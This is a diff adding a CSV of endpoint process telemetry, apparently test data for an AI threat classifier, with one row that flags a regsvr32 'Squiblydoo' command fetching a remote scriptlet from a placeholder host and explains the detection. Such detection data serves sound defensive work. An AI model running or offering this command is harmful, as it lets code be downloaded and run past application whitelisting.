@@ -1,0 +1,41 @@
+pid,process_name,process_owner,process_hash_sha256,cert_status,thread_count,parent_pid,command_line,has_connection,network_protocol,network_connection_state,network_out_process_ip,network_out_process_fqdn,network_out_process_port,network_out_process_service,network_in_process_ip,network_in_process_fqdn,network_in_process_port,network_in_process_service,is_orphan_connection,AI__Model_classification,AI__Model_confidence,AI__Threat_Intel_Finding,AI__Model_Reason
+8122,regsvr32.exe,USER,unknown,signed,3,4120,regsvr32 /s /n /u /i:https://files.example/scrobj.dll scrobj.dll,True,TCP,ESTABLISHED,198.51.100.44,files.example,443,https,192.168.1.25,unknown,55300,unknown,False,MALICIOUS,HIGH,"## Hash Lookup
+
+Not Available. SHA-256 hash was not provided for this process instance.
+
+## IP Lookup
+
+198.51.100.44 — No confirmed malicious match found in open-source threat intelligence feeds. Note: 198.51.100.44 falls within the IANA-reserved TEST-NET-3 documentation range (198.51.100.0/24), which should never appear as a real routable destination on a production network. Its presence as an active ESTABLISHED connection destination is itself anomalous and suspicious.
+
+## Domain Lookup
+
+files.example — No malicious match found in open-source feeds. However, ""example"" TLD domains (example.com, files.example, etc.) are IANA-reserved for documentation and testing purposes only and are not legitimate internet destinations. An ESTABLISHED HTTPS connection to this domain on a production endpoint is highly anomalous.
+
+## Other Intelligence
+
+The command line pattern — regsvr32 /s /n /u /i:https://<URL> scrobj.dll — is the textbook ""Squiblydoo"" technique, formally catalogued as MITRE ATT&CK T1218.010 (System Binary Proxy Execution: Regsvr32). This technique is used to load a remote COM scriptlet via a URL, bypassing application whitelisting without making Registry changes. It has been used in campaigns targeting governments and is actively exploited by multiple threat actor groups.
+
+## References Consulted
+
+• MITRE ATT&CK T1218.010
+• MITRE CAR-2019-04-003 (Squiblydoo)
+• AbuseIPDB (198.51.100.44)
+• AlienVault OTX (files.example)
+• Splunk Security Content — Detect Regsvr32 Application Control Bypass
+• SOC Prime — Squiblydoo Attack Analysis","## Indicators Observed
+
+• Squiblydoo LOLBin abuse: regsvr32 /s /n /u /i:https://<remote-URL> scrobj.dll — exact MITRE T1218.010 pattern
+
+• Remote COM scriptlet load: scrobj.dll used to execute a remotely hosted payload over HTTPS, bypassing application whitelisting
+
+• Anomalous destination IP: 198.51.100.44 is within the IANA-reserved TEST-NET-3 documentation block — not a legitimate routable address on any production network
+
+• Anomalous destination domain: files.example is an IANA-reserved documentation domain — no legitimate production traffic should resolve or connect to it
+
+• Active ESTABLISHED TCP/443 session: confirms successful outbound connection to the suspicious destination, not merely an attempt
+
+• No hash available: executable integrity cannot be verified, preventing ruling out a tampered or replaced binary
+
+## Assessment
+
+The command line is a near-exact match for the Squiblydoo technique (MITRE T1218.010), in which regsvr32.exe — a trusted, signed Windows LOLBin — is abused to fetch and execute a remote COM scriptlet via scrobj.dll, bypassing application whitelisting without touching the Registry. The outbound connection is ESTABLISHED to both an IANA documentation-reserved IP (198.51.100.44) and a reserved domain (files.example), neither of which should ever appear as real network destinations, strongly suggesting fabricated or adversary-controlled infrastructure. The convergence of a confirmed LOLBin abuse pattern, remote payload staging, and connections to non-routable/reserved infrastructure constitutes high-confidence malicious activity."
